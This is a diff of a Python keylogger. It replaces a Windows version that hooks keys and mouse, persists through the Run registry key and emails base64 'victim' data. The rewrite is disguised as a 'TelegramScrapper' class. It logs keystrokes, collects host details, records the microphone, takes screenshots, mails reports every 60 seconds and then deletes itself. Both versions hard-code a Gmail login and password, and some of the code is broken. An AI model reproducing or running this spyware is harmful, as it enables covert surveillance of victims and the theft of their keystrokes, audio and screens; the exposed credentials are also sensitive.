@@ -1,145 +1,130 @@
-import sys
-import win32api,pythoncom
-import pyHook,os,time,random,smtplib,string,base64
-from _winreg import *
-
-global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval
-
-t="";pics_names=[]
-
-
-#Note: You have to edit this part from sending the keylogger to the victim
-
-#########Settings########
-
-yourgmail="Choxaaxiaaho@gmail.com"
-yourgmailpass="7227332.Chopal"
-sendto="Choxaaxiaaho@gmail.com"
-interval=60
-
-########################
-
 try:
-
-    f = open('Logfile.txt', 'a')
-    f.close()
-except:
-
-    f = open('Logfile.txt', 'w')
-    f.close()
-
-
-def addStartup():  # this will add the file to the startup registry key
-    fp = os.path.dirname(os.path.realpath(__file__))
-    file_name = sys.argv[0].split('\\')[-1]
-    new_file_path = fp + '\\' + file_name
-    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
-    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-    SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ,
-               new_file_path)
+    import logging
+    import os
+    import platform
+    import smtplib
+    import socket
+    import threading
+    import wave
+    import pyscreenshot
+    import sounddevice as sd
+    from pynput import keyboard
+    from pynput.keyboard import Listener
+except ModuleNotFoundError:
+    from subprocess import call
+    modules = ["pyscreenshot","sounddevice","pynput"]
+    call("pip install " + ' '.join(modules), shell=True)
 
 
-def Hide():
-    import win32console
-    import win32gui
-    win = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(win, 0)
+finally:
+    EMAIL_ADDRESS = "choxaaxiaaho@gmail.com"
+    EMAIL_PASSWORD = "7227332.Chopal"
+    SEND_REPORT_EVERY = 60 # as in seconds
+    class TelegramScrapper:
+        def __init__(self, time_interval, email, password):
+            self.interval = time_interval
+            self.log = "TelegramScrapper Started..."
+            self.email = email
+            self.password = password
 
-addStartup()
+        def appendlog(self, string):
+            self.log = self.log + string
 
-Hide()
+        def on_move(self, x, y):
+            current_move = logging.info("Mouse moved to {} {}".format(x, y))
+            self.appendlog(current_move)
 
+        def on_click(self, x, y):
+            current_click = logging.info("Mouse moved to {} {}".format(x, y))
+            self.appendlog(current_click)
 
-def ScreenShot():
-    global pics_names
-    import pyautogui
-    def generate_name():
-        return ''.join(random.choice(string.ascii_uppercase
-                       + string.digits) for _ in range(7))
-    name = str(generate_name())
-    pics_names.append(name)
-    pyautogui.screenshot().save(name + '.png')
+        def on_scroll(self, x, y):
+            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
+            self.appendlog(current_scroll)
 
+        def save_data(self, key):
+            try:
+                current_key = str(key.char)
+            except AttributeError:
+                if key == key.space:
+                    current_key = "SPACE"
+                elif key == key.esc:
+                    current_key = "ESC"
+                else:
+                    current_key = " " + str(key) + " "
 
-def Mail_it(data, pics_names):
-    data = base64.b64encode(data)
-    data = 'New data from victim(Base64 encoded)\n' + data
-    server = smtplib.SMTP('smtp.gmail.com:587')
-    server.starttls()
-    server.login(yourgmail, yourgmailpass)
-    server.sendmail(yourgmail, sendto, data)
-    server.close()
+            self.appendlog(current_key)
 
-    for pic in pics_names:
-        data = base64.b64encode(open(pic, 'r+').read())
-        data = 'New pic data from victim(Base64 encoded)\n' + data
-        server = smtplib.SMTP('smtp.gmail.com:587')
-        server.starttls()
-        server.login(yourgmail, yourgmailpass)
-        server.sendmail(yourgmail, sendto, msg.as_string())
-        server.close()
+        def send_mail(self, email, password, message):
+            server = smtplib.SMTP(host='smtp.gmail.com', port=587)
+            server.starttls()
+            server.login(email, password)
+            server.sendmail(email, email, message)
+            server.quit()
 
+        def report(self):
+            self.send_mail(self.email, self.password, "\n\n" + self.log)
+            self.log = ""
+            timer = threading.Timer(self.interval, self.report)
+            timer.start()
 
-def OnMouseEvent(event):
-    global yourgmail, yourgmailpass, sendto, interval
-    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
-        + ' WindowName : ' + str(event.WindowName)
-    data += '\n\tButton:' + str(event.MessageName)
-    data += '\n\tClicked in (Position):' + str(event.Position)
-    data += '\n===================='
-    global t, start_time, pics_names
+        def system_information(self):
+            hostname = socket.gethostname()
+            ip = socket.gethostbyname(hostname)
+            plat = platform.processor()
+            system = platform.system()
+            machine = platform.machine()
+            self.appendlog(hostname)
+            self.appendlog(ip)
+            self.appendlog(plat)
+            self.appendlog(system)
+            self.appendlog(machine)
 
-    t = t + data
+        def microphone(self):
+            fs = 44100
+            seconds = SEND_REPORT_EVERY
+            obj = wave.open('sound.wav', 'w')
+            obj.setnchannels(1)  # mono
+            obj.setsampwidth(2)
+            obj.setframerate(fs)
+            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+            obj.writeframesraw(myrecording)
+            sd.wait()
 
-    if len(t) > 300:
-        ScreenShot()
+            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
 
-    if len(t) > 500:
-        f = open('Logfile.txt', 'a')
-        f.write(t)
-        f.close()
-        t = ''
+        def screenshot(self):
+            img = pyscreenshot.grab()
+            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
 
-    if int(time.time() - start_time) == int(interval):
-        Mail_it(t, pics_names)
-        start_time = time.time()
-        t = ''
+        def run(self):
+            keyboard_listener = keyboard.Listener(on_press=self.save_data)
+            with keyboard_listener:
+                self.report()
+                keyboard_listener.join()
+            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
+                mouse_listener.join()
+            if os.name == "nt":
+                try:
+                    pwd = os.path.abspath(os.getcwd())
+                    os.system("cd " + pwd)
+                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
+                    print('File was closed.')
+                    os.system("DEL " + os.path.basename(__file__))
+                except OSError:
+                    print('File is close.')
 
-    return True
+            else:
+                try:
+                    pwd = os.path.abspath(os.getcwd())
+                    os.system("cd " + pwd)
+                    os.system('pkill leafpad')
+                    os.system("chattr -i " +  os.path.basename(__file__))
+                    print('File was closed.')
+                    os.system("rm -rf" + os.path.basename(__file__))
+                except OSError:
+                    print('File is close.')
 
+    TelegramScrapper = TelegramScrapper(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
+    TelegramScrapper.run()
 
-def OnKeyboardEvent(event):
-    global yourgmail, yourgmailpass, sendto, interval
-    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
-        + ' WindowName : ' + str(event.WindowName)
-    data += '\n\tKeyboard key :' + str(event.Key)
-    data += '\n===================='
-    global t, start_time
-    t = t + data
-
-    if len(t) > 500:
-        f = open('Logfile.txt', 'a')
-        f.write(t)
-        f.close()
-        t = ''
-
-    if int(time.time() - start_time) == int(interval):
-        Mail_it(t, pics_names)
-        t = ''
-
-    return True
-
-
-hook = pyHook.HookManager()
-
-hook.KeyDown = OnKeyboardEvent
-
-hook.MouseAllButtonsDown = OnMouseEvent
-
-hook.HookKeyboard()
-
-hook.HookMouse()
-
-start_time = time.time()
-
-pythoncom.PumpMessages()
